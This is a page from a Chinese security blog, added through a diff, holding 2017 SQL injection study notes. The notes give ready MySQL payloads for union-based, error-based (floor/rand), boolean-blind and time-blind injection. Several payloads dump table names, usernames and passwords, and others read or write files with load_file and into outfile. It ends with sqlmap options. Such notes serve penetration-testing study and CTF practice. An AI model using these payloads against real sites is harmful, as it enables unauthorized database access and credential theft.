@@ -1,0 +1,561 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="baidu-site-verification" content="L6Lm9d5Crl"/>
+  
+  
+  
+  
+  <title>Sql注入笔记 | r1b00t’Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="r1b00t|sql注入|sql">
+<meta name="keywords" content="渗透,sql注入,sql">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Sql注入笔记">
+<meta property="og:url" content="https://r1b00t.github.io/2017/08/30/sql注入笔记/index.html">
+<meta property="og:site_name" content="r1b00t’Blog">
+<meta property="og:description" content="r1b00t|sql注入|sql">
+<meta property="og:updated_time" content="2017-08-30T09:14:06.223Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Sql注入笔记">
+<meta name="twitter:description" content="r1b00t|sql注入|sql">
+  
+    <link rel="alternative" href="/atom.xml" title="r1b00t’Blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.png">
+  
+  
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
+  
+      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+  <!-- 加载特效 -->
+    <script src="/js/pace.js"></script>
+    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet" />
+  <script>
+      var yiliaConfig = {
+          fancybox: true,
+          animate: false,
+          isHome: false,
+          isPost: true,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false
+      }
+  </script>
+</head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+        <a href="/" class="profilepic">
+            
+            <img src="/img/avatar.png" class="js-avatar" style="width: 100%;height: 100%;opacity: 1;">
+            
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">r1b00t</a></h1>
+        </hgroup>
+        
+        <p class="header-subtitle">r1b00t</p>
+        
+        
+        
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a  href="/archives/">所有文章</a></li>
+                        
+                            <li><a  href="/categories/ctf">CTF</a></li>
+                        
+                            <li><a  href="/categories/Web渗透">Web渗透</a></li>
+                        
+                            <li><a  href="/categories/nw">内网渗透</a></li>
+                        
+                            <li><a  href="/categories/vuln">漏洞</a></li>
+                        
+                            <li><a  href="/categories/kali">Kali</a></li>
+                        
+                            <li><a  href="/categories/linux">Linux</a></li>
+                        
+                            <li><a  href="/categories/python">Python</a></li>
+                        
+                            <li><a  href="/about">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fl github"  target="_blank" href="https://r1b00t.github.io/" title="github">github</a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <a href="/tags/SOCKS/" style="font-size: 10px;">SOCKS</a> <a href="/tags/Windows/" style="font-size: 12.5px;">Windows</a> <a href="/tags/ctf/" style="font-size: 10px;">ctf</a> <a href="/tags/fpipe/" style="font-size: 12.5px;">fpipe</a> <a href="/tags/htran/" style="font-size: 10px;">htran</a> <a href="/tags/kali/" style="font-size: 10px;">kali</a> <a href="/tags/kali-Hydra/" style="font-size: 10px;">kali Hydra</a> <a href="/tags/lcx/" style="font-size: 12.5px;">lcx</a> <a href="/tags/linux/" style="font-size: 12.5px;">linux</a> <a href="/tags/metasploit/" style="font-size: 10px;">metasploit</a> <a href="/tags/metinfo/" style="font-size: 10px;">metinfo</a> <a href="/tags/msfvenom/" style="font-size: 10px;">msfvenom</a> <a href="/tags/nc/" style="font-size: 12.5px;">nc</a> <a href="/tags/portscan/" style="font-size: 10px;">portscan</a> <a href="/tags/python/" style="font-size: 12.5px;">python</a> <a href="/tags/reduh/" style="font-size: 10px;">reduh</a> <a href="/tags/sql/" style="font-size: 10px;">sql</a> <a href="/tags/sql注入/" style="font-size: 12.5px;">sql注入</a> <a href="/tags/zip/" style="font-size: 10px;">zip</a> <a href="/tags/代理/" style="font-size: 10px;">代理</a> <a href="/tags/内网/" style="font-size: 17.5px;">内网</a> <a href="/tags/反弹shell/" style="font-size: 10px;">反弹shell</a> <a href="/tags/多线程/" style="font-size: 10px;">多线程</a> <a href="/tags/提权/" style="font-size: 10px;">提权</a> <a href="/tags/渗透/" style="font-size: 20px;">渗透</a> <a href="/tags/漏洞/" style="font-size: 15px;">漏洞</a> <a href="/tags/爆破/" style="font-size: 10px;">爆破</a> <a href="/tags/端口扫描/" style="font-size: 10px;">端口扫描</a>
+                    </div>
+                </section>
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a target="_blank"  class="main-nav-link switch-friends-link" href="https://r1b00t.github.io">github</a>
+                    
+                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://www.shiyanbar.com">实验吧</a>
+                    
+                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://www.ichunqiu.com">i春秋</a>
+                    
+                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://www.freebuf.com">FreeBuf</a>
+                    
+                      <a target="_blank"  class="main-nav-link switch-friends-link" href="https://www.leavesongs.com/">phith0n</a>
+                    
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">爱好枪击游戏，爱好渗透</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>
+</div>
+
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">r1b00t</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                
+                    <img src="/img/avatar.png" class="js-avatar" style="width: 100%; height: 100%; opacity: 1;">
+                
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">r1b00t</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">r1b00t</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/categories/ctf">CTF</a></li>
+                
+                    <li><a href="/categories/Web渗透">Web渗透</a></li>
+                
+                    <li><a href="/categories/nw">内网渗透</a></li>
+                
+                    <li><a href="/categories/vuln">漏洞</a></li>
+                
+                    <li><a href="/categories/kali">Kali</a></li>
+                
+                    <li><a href="/categories/linux">Linux</a></li>
+                
+                    <li><a href="/categories/python">Python</a></li>
+                
+                    <li><a href="/about">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                <div class="social">
+                    
+                        <a class="github" target="_blank" href="https://r1b00t.github.io/" title="github">github</a>
+                    
+                </div>
+            </nav>
+        </header>                
+    </div>
+</nav>
+      <div class="body-wrap"><article id="post-sql注入笔记" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2017/08/30/sql注入笔记/" class="article-date">
+      <time datetime="2017-08-30T09:08:52.268Z" itemprop="datePublished">2017-08-30</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Sql注入笔记
+    </h1>
+  
+
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/Web渗透/">Web渗透</a>
+    </div>
+
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql/">sql</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql注入/">sql注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/渗透/">渗透</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>#sql注入笔记详细</p>
+<h2 id="0x01-传参方式"><a href="#0x01-传参方式" class="headerlink" title="0x01 传参方式"></a>0x01 传参方式</h2><p>  ● 传参方式一般通过get方式，或者post方式提交，前者的优点是效率高，后者的优点是安全性好、参数的长度长。在sql注入攻击中，通常会选择用户输入内容的地方进行攻击。除此之外，http header中也存在sql注入，比如referer,cookie等等。所以思路一定要开阔，凡是输入数据库的内容都有可能是突破口。</p>
+<h2 id="0x02-常用的mysql语句"><a href="#0x02-常用的mysql语句" class="headerlink" title="0x02 常用的mysql语句"></a>0x02 常用的mysql语句</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">（1）SELECT 列名称 FROM 表名称 WHERE 条件 #从表中选取数据</div><div class="line">     eg.:select username,password from users where id=input</div><div class="line">     </div><div class="line">（2）UPDATE 表名称 SET 列名称=新值 WHERE 其他列名称 = 某值 #修改表中某值</div><div class="line">     eg.:update users set password=’inputpass’ where username=’inputuser’</div><div class="line">     </div><div class="line">（3）insert into 表名称 values （值1，值2，…….） #向表格中插入新的行，其中values中插入的值可为逻辑运算的结果</div><div class="line">     eg.:insert into users values (’15’,’name’,’pass’)</div></pre></td></tr></table></figure>
+<h2 id="如下是注入常用操作："><a href="#如下是注入常用操作：" class="headerlink" title="如下是注入常用操作："></a>如下是注入常用操作：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">   ● （1）注释符：# ， –+ ， //</div><div class="line"></div><div class="line">● （2）联合查询：UNION</div><div class="line">操作符用于合并两个或多个 SELECT 语句的结果集。</div><div class="line"></div><div class="line">● （3）ORDER BY 语句用于对结果集进行排序,注入攻击中用于测试列的数量。</div><div class="line"></div><div class="line">● （4）group_concat() 会计算哪些行属于同一组，将属于同一组的列显示出来。攻击时使用他的主要目的是将字段同时显示出来。</div><div class="line"></div><div class="line">● （5）count() 统计元祖的个数。</div><div class="line"></div><div class="line">● （6）rand() 用于产生一个0~1的随机数</div><div class="line"></div><div class="line">● （7）floor() 向下取整。</div><div class="line"></div><div class="line">● （8）group by 依据我们想要的规则，对结果进行分组（会对规则进行排序）。</div><div class="line"></div><div class="line">● （9）outfile select from … where … into outfile ‘目标文件’ 将表的内容导出成为一个文本文件。</div><div class="line"></div><div class="line">● （10）dumpfile select from … limit 0,1 where … into dumpfile ‘目标文件’ 将其中一行导出成文件，所以要加limit。</div><div class="line"></div><div class="line">● （11）load_file select load_file(‘目标文件’) 载入上述文件。</div><div class="line"></div><div class="line">● （12）length()返回字符串长度。</div><div class="line"></div><div class="line">● （13）substr()截取字符串substr(字符串，位置，长度) substr(database(),1,1) 。</div><div class="line"></div><div class="line">● （14）ascii()返回字符的ascii码 #通过&gt;,&lt;,=对字符的ascii进行缩小范围，从而确定字符。</div><div class="line"></div><div class="line">● （15）sleep(n)程序挂起n秒。用于时间盲注。</div><div class="line"></div><div class="line">● （16）if（a,b,c） 相同于a?b:c</div></pre></td></tr></table></figure>
+<h2 id="0x03-sql注入语句的构造"><a href="#0x03-sql注入语句的构造" class="headerlink" title="0x03 sql注入语句的构造"></a>0x03 sql注入语句的构造</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">（1）SELECT 列名称 FROM 表名称 WHERE 条件</div><div class="line">select username,password from users where id=inputselect username,password from users where id=’input’select username,password from users where id=”input”select username,password from users where id=(‘input’)</div></pre></td></tr></table></figure>
+<h3 id="I-联合查询的注入"><a href="#I-联合查询的注入" class="headerlink" title="I.联合查询的注入"></a>I.联合查询的注入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">1) 测试猜测语句，分别尝试输入：’ ” ‘) / \ 测试是否报错</div><div class="line"></div><div class="line">2) 测试：1′ or ‘1’=’1</div><div class="line">插入语句后成为：</div><div class="line">    select username,password from users where id=’1′ or ‘1’=’1′</div><div class="line">完整闭合，语句可以正确执行或者使用注释符使其闭合</div><div class="line">测试：</div><div class="line">    1′ or 1=1#1′ or 1=1–+</div><div class="line">    </div><div class="line">3)  order by 语句测试列数</div><div class="line">1’order by 3#select username,password from users where id=’1’order by 3#’</div><div class="line">成功，则证明该语句没有错误，存在至少3列继续测试：1’order by 4#，发现出错，证明该表共存在3列。</div><div class="line"></div><div class="line">4)  union select 联合查询</div><div class="line">1’union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=’security’ –+</div><div class="line"></div><div class="line">concat() 爆出所有表名</div><div class="line"></div><div class="line">5)  爆用户名、密码</div><div class="line">1’union select 1,group_concat(username,password),3 from users–+#也可以在1，2，3处替换任意其他命令</div></pre></td></tr></table></figure>
+<h2 id="II-基于报错的注入"><a href="#II-基于报错的注入" class="headerlink" title="II.基于报错的注入"></a>II.基于报错的注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">语句测试，当使用 1’union selcet 1,2,3 –+ 返回还是正常页面，因此我们要利用报错信息</div><div class="line"></div><div class="line">1′ and ( select 1 from (select count(),concat(‘~’,’~’,database(),’~’,’~’,floor(rand()2))name from information_schema.tables group by name)b)–+</div><div class="line"></div><div class="line">含义：取名concat(‘~’,’~’,database(),’~’,’~’,floor(rand()2))为name，count()name的个数，这时候会报错，从而爆出database()的值，’~’的用途在于方便识别。</div><div class="line"></div><div class="line">整个语句分析：整体相当于select 1 from b；</div><div class="line">其中b = select count(),concat(‘~’,’~’,database(),’~’,’~’,floor(rand()2))name from information_schema.tables group by name ，count()name的个数；</div><div class="line">name=concat(‘~’,’~’,database(),’~’,’~’,floor(rand()2))</div></pre></td></tr></table></figure>
+<h2 id="III-布尔盲注"><a href="#III-布尔盲注" class="headerlink" title="III.布尔盲注"></a>III.布尔盲注</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">1)  当出现无论输入任何语句页面只有两种情况的时候，即只存在正确页面和错误页面时，而不显示报错信息，这样我们就需要进行布尔盲注。通过猜测目标字符串字符的ascii码来确定字符，但该过程非常繁琐，自动化工具更方便一些。</div><div class="line">2)  语句构造：</div><div class="line">1’ and (ascii(substr(database(),1,1)))&gt;100 –+</div><div class="line">返回正确页面说明该范围正确，返回错误页面相当于范围不正确，最后用等号确定。</div></pre></td></tr></table></figure>
+<h2 id="IV-基于时间的盲注"><a href="#IV-基于时间的盲注" class="headerlink" title="IV.基于时间的盲注"></a>IV.基于时间的盲注</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">1)  这种情况下就是所有语句下页面只存在正确的一种，这样就用到了基于时间的盲注，原理是如果正确就执行sleep()函数，使程序挂起，这样我们就可以知道语句正确还是错误了。一般使用sleep(5)，使程序挂起5秒钟。</div><div class="line"></div><div class="line">2)  语句构造： 1′ and (select if (ascii(substr(database(),1,1))&gt;100,sleep(5),NULL)) –+</div><div class="line"></div><div class="line">UPDATE 表名称 SET 列名称=新值 WHERE 其他列名称 = 某值 #修改表中某值</div><div class="line">eg.:update users set password=’inputpass’ where username=’inputuser’</div></pre></td></tr></table></figure>
+<h2 id="基于错误的sql注入"><a href="#基于错误的sql注入" class="headerlink" title="基于错误的sql注入"></a>基于错误的sql注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">语句构造：  uname=admin&amp;passwd=’ and (select 1 from (select count(*),(concat(“~”,database(),”~”,floor(rand()*2)))name from information_schema.tables group by name)b)#&amp;submit=submit</div><div class="line"></div><div class="line">insert into 表名称 values （值1，值2，…….） #向表格中插入新的行，其中values中插入的值可为逻辑运算的结果。</div><div class="line"></div><div class="line">这里我们的思路一定要开放，意识到注入点位置的广泛性。例如user-agent，http referer,都有可能存在注入点。</div><div class="line"></div><div class="line">基于错误的sql注入,语句构造： 1′,(select 1 from (select count(*),(concat(“~”,(select table_name from information_schema.tables where table_schema=database() limit 0,1),”~”,floor(rand()*2)))name from information_schema.tables group by name)b)</div></pre></td></tr></table></figure>
+<h2 id="0x04-个人常用的基于错误的语句"><a href="#0x04-个人常用的基于错误的语句" class="headerlink" title="0x04 个人常用的基于错误的语句"></a>0x04 个人常用的基于错误的语句</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">1. (select 1 from (select count(*),(concat(“~”,(select table_name from information_schema.tables where table_schema=database() limit 0,1),”~”,floor(rand()*2)))name from information_schema.tables group by name)b) /*爆数据库*/</div><div class="line"></div><div class="line">2. (select 1 from (select count(*),(concat(“~”,current_user,”~”,floor(rand()*2)))name from information_schema.tables group by name)b) /*爆当前用户名*/</div><div class="line"></div><div class="line">3. (select 1 from (select count(*),(concat(“~”,(select username from users limit 0,1),”~”,floor(rand()*2)))name from information_schema.tables group by name)b) /*爆所有用户名*/</div><div class="line"></div><div class="line">附mysql中常见的系统函数及变量：</div><div class="line">  user() 用户名;</div><div class="line">  session_user()连接数据库的用户名;</div><div class="line">  database() 数据库名;</div><div class="line">  version() MYSQL数据库版本;</div><div class="line">  @@datadir 数据库路径;</div><div class="line">  current_user 当前用户名;</div><div class="line">  @@hostname 主机名;</div><div class="line">  @@port 数据库端口;</div><div class="line">  @@version_compile_os 操作系统;</div><div class="line">  basedir MYSQL安装路径</div></pre></td></tr></table></figure>
+<h2 id="0x05-sqlmap使用"><a href="#0x05-sqlmap使用" class="headerlink" title="0x05 sqlmap使用"></a>0x05 sqlmap使用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap作为一款强大的注入工具必不可少，它可以进行post注入(–data)，cookie注入(–cookie)，自定义注入级别(–leval)，自定义注入参数(-p)，自定义延时时间(–delay)，执行自定义python代码(–eval)，注入payload(–prefix ; –suffix)</div></pre></td></tr></table></figure>
+<p>```</p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a  href="/2017/08/30/sql注入笔记/">Sql注入笔记</a></p>
+        <p><span>文章作者:</span><a  href="/" title="访问 r1b00t 的个人博客">r1b00t</a></p>
+        <p><span>发布时间:</span>2017年08月30日 - 17时08分</p>
+        <p><span>最后更新:</span>2017年08月30日 - 17时14分</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2017/08/30/sql注入笔记/" title="Sql注入笔记">https://r1b00t.github.io/2017/08/30/sql注入笔记/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://r1b00t.github.io/2017/08/30/sql注入笔记/　　作者: r1b00t" title=""></span>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+<nav id="article-nav">
+  
+    <a  href="/2017/08/30/Metinfo5.3.17前台sql注入/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption"><</strong>
+      <div class="article-nav-title">
+        
+          Fck编辑器漏洞
+        
+      </div>
+    </a>
+  
+  
+    <a  href="/2017/08/29/python编写简单端口扫描/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">python编写简单多线程指定端口扫描工具</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-传参方式"><span class="toc-number">1.</span> <span class="toc-text">0x01 传参方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-常用的mysql语句"><span class="toc-number">2.</span> <span class="toc-text">0x02 常用的mysql语句</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#如下是注入常用操作："><span class="toc-number">3.</span> <span class="toc-text">如下是注入常用操作：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-sql注入语句的构造"><span class="toc-number">4.</span> <span class="toc-text">0x03 sql注入语句的构造</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#I-联合查询的注入"><span class="toc-number">4.1.</span> <span class="toc-text">I.联合查询的注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#II-基于报错的注入"><span class="toc-number">5.</span> <span class="toc-text">II.基于报错的注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#III-布尔盲注"><span class="toc-number">6.</span> <span class="toc-text">III.布尔盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IV-基于时间的盲注"><span class="toc-number">7.</span> <span class="toc-text">IV.基于时间的盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#基于错误的sql注入"><span class="toc-number">8.</span> <span class="toc-text">基于错误的sql注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-个人常用的基于错误的语句"><span class="toc-number">9.</span> <span class="toc-text">0x04 个人常用的基于错误的语句</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-sqlmap使用"><span class="toc-number">10.</span> <span class="toc-text">0x05 sqlmap使用</span></a></li></ol>
+</div>
+<style>
+    .left-col .switch-btn {
+        display: none;
+    }
+    .left-col .switch-area {
+        display: none;
+    }
+</style>
+<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+<script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+            $(".switch-btn, .switch-area").fadeOut(300);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+            $(".switch-btn, .switch-area").fadeIn(500);
+        }
+    })
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+        $(".switch-btn, .switch-area").show();
+    }
+</script>
+
+
+
+
+<div class="bdsharebuttonbox">
+	<a href="#" class="fx fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+	<a href="#" class="fx fa-weixin bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+	<a href="#" class="fx fa-qq bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+	<a href="#" class="fx fa-facebook-official bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+	<a href="#" class="fx fa-twitter bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+	<a href="#" class="fx fa-linkedin bds_linkedin" data-cmd="linkedin" title="分享到linkedin"></a>
+	<a href="#" class="fx fa-files-o bds_copy" data-cmd="copy" title="分享到复制网址"></a>
+</div>
+<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>
+
+
+
+
+    
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a  href="/2017/08/30/Metinfo5.3.17前台sql注入/" title="上一篇: Fck编辑器漏洞">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+        
+            <a  href="/2017/08/29/python编写简单端口扫描/" title="下一篇: python编写简单多线程指定端口扫描工具">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/08/30/FPipe端口转发使用/">FPipe进行端口重定向使用方法</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/30/内网渗透端口转发和代理软件/">内网渗透所需要的端口转发和代理软件的使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/30/Metinfo5.3.17前台sql注入/">Fck编辑器漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/30/sql注入笔记/">Sql注入笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/29/python编写简单端口扫描/">python编写简单多线程指定端口扫描工具</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/29/python编写简单zip爆破工具/">python编写简单zip爆破工具</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/29/linux下各种反弹shell/">linux下各种反弹shell</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/29/rudh+lcx+nc内网渗透笔记/">reduh+lcx+nc内网渗透笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/29/Windows内网渗透常用命令/">Windows内网渗透提权命令</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/29/Hydra/">Hydra使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/29/ThinkPHP2.1命令执行漏洞/">ThinkPHP2.1命令执行漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/29/linux学习笔记/">Linux学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/29/msfvenom生成shell/">msfvenom生成shell</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/29/FCK编辑器漏洞/">Fck编辑器漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/29/Redis未授权访问漏洞/">Redis未授权访问漏洞getshell</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/29/各种中间件漏洞/">各种中间件漏洞笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/29/web安全/">Web安全靶机实战</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/29/ctf线下加固/">CTF线下加固</a></li></ul>
+    <script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+    <script>
+        $(".post-list").addClass("toc-article");
+        // $(".post-list-item a").attr("target","_blank");
+        $("#post-nav-button > a:nth-child(2)").click(function() {
+            $(".fa-bars, .fa-times").toggle();
+            $(".post-list").toggle(300);
+            if ($(".toc").length > 0) {
+                $("#toc, #tocButton").toggle(200, function() {
+                    if ($(".switch-area").is(":visible")) {
+                        $("#toc, .switch-btn, .switch-area").toggle();
+                        $("#tocButton").attr("value", valueHide);
+                        }
+                    })
+            }
+            else {
